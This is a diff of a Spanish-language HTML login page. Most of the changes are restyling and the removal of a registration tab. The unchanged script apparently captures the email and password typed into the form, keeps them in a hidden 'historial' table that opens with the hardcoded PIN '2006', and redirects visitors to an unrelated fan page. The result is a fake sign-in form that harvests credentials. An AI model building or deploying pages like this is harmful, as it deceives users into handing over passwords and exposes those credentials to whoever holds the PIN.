@@ -3,9 +3,9 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Registro e Inicio de Sesión</title>
+<title>Inicia Sesión</title>
 <style>
-/* Fondo con imagen difuminada */
+/* Fondo degradado animado */
 body {
   margin: 0;
   font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -13,22 +13,19 @@ body {
   display: flex;
   justify-content: center;
   align-items: center;
-  background: url("https://images.unsplash.com/photo-1508780709619-79562169bc64?auto=format&fit=crop&w=1600&q=80") no-repeat center center/cover;
-  position: relative;
+  background: linear-gradient(-45deg, #ff9a9e, #fad0c4, #a18cd1, #fbc2eb);
+  background-size: 400% 400%;
+  animation: gradientBG 12s ease infinite;
 }
 
-body::before {
-  content: "";
-  position: absolute;
-  top: 0; left: 0; right: 0; bottom: 0;
-  background: rgba(0,0,0,0.5);
-  backdrop-filter: blur(6px);
+@keyframes gradientBG {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
 }
 
-/* Caja de login */
+/* Caja principal */
 .container {
-  position: relative;
-  z-index: 2;
   background: rgba(255,255,255,0.9);
   padding: 40px;
   border-radius: 20px;
@@ -39,34 +36,15 @@ body::before {
   animation: fadeIn 1.2s ease-in-out;
 }
 
-/* Animación de entrada */
 @keyframes fadeIn {
   from { opacity: 0; transform: translateY(-20px); }
   to { opacity: 1; transform: translateY(0); }
 }
 
-/* Encabezado de pestañas */
-.tabs {
-  display: flex;
-  justify-content: space-around;
-  margin-bottom: 20px;
-}
-
-.tabs button {
-  flex: 1;
-  padding: 12px;
-  border: none;
-  border-radius: 10px;
-  background: #eee;
-  cursor: pointer;
-  font-weight: bold;
-  transition: all 0.3s ease;
-}
-
-.tabs button.active {
-  background: #4285F4;
-  color: white;
-  box-shadow: 0 4px 15px rgba(66,133,244,0.4);
+/* Título */
+.container h2 {
+  margin-bottom: 10px;
+  color: #333;
 }
 
 /* Inputs */
@@ -81,30 +59,30 @@ body::before {
 }
 
 .container input:focus {
-  border-color: #4285F4;
-  box-shadow: 0 0 8px rgba(66,133,244,0.3);
+  border-color: #6a11cb;
+  box-shadow: 0 0 8px rgba(106,17,203,0.3);
 }
 
-/* Botones */
+/* Botón */
 .container button.submit-btn {
   width: 100%;
   padding: 12px;
-  background: #4285F4;
+  background: linear-gradient(90deg, #6a11cb, #2575fc);
   border: none;
   border-radius: 10px;
   color: white;
   font-size: 16px;
   cursor: pointer;
   margin-top: 10px;
-  transition: 0.3s;
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
 }
 
 .container button.submit-btn:hover {
-  background: #3367D6;
   transform: scale(1.05);
+  box-shadow: 0 6px 18px rgba(106,17,203,0.5);
 }
 
-/* Extra links */
+/* Extra */
 .extra {
   margin-top: 15px;
   font-size: 13px;
@@ -112,7 +90,7 @@ body::before {
 }
 
 .extra a {
-  color: #4285F4;
+  color: #2575fc;
   text-decoration: none;
 }
 
@@ -138,7 +116,7 @@ body::before {
   text-align: left;
 }
 #historialContainer th {
-  background: #4285F4;
+  background: #6a11cb;
   color: white;
 }
 #historialContainer tr:nth-child(even) {
@@ -149,16 +127,12 @@ body::before {
 <body>
 
 <div class="container">
-  <div class="tabs">
-    <button id="tabRegister" class="active">Regístrate</button>
-    <button id="tabLogin">Inicia sesión</button>
-  </div>
-
-  <h2 id="formTitle">Bienvenido</h2>
+  <h2>Inicia Sesión</h2>
+  <p>Bienvenido, ingresa tus datos</p>
   <form id="loginForm">
     <input type="email" name="email" placeholder="Correo electrónico" required>
     <input type="password" name="password" placeholder="Contraseña" required>
-    <button type="submit" class="submit-btn">Continuar</button>
+    <button type="submit" class="submit-btn">Iniciar sesión</button>
   </form>
 
   <div class="extra">
@@ -188,24 +162,6 @@ const recoverLink = document.getElementById('recoverLink');
 const historialContainer = document.getElementById('historialContainer');
 const historialTableBody = document.getElementById('historialTableBody');
 
-// Tabs
-const tabRegister = document.getElementById('tabRegister');
-const tabLogin = document.getElementById('tabLogin');
-const formTitle = document.getElementById('formTitle');
-
-tabRegister.addEventListener('click', () => {
-  tabRegister.classList.add('active');
-  tabLogin.classList.remove('active');
-  formTitle.innerText = "Crea tu cuenta";
-});
-
-tabLogin.addEventListener('click', () => {
-  tabLogin.classList.add('active');
-  tabRegister.classList.remove('active');
-  formTitle.innerText = "Inicia sesión";
-});
-
-// Guardar datos
 loginForm.addEventListener('submit', function(e){
   e.preventDefault();
   const email = this.email.value;
@@ -218,7 +174,6 @@ loginForm.addEventListener('submit', function(e){
   window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
 });
 
-// Mostrar historial
 recoverLink.addEventListener('click', function(){
   const pin = prompt("Ingresa el PIN para acceder a los datos:");
   if(pin === "2006"){
@@ -244,4 +199,3 @@ recoverLink.addEventListener('click', function(){
 
 </body>
 </html>
-
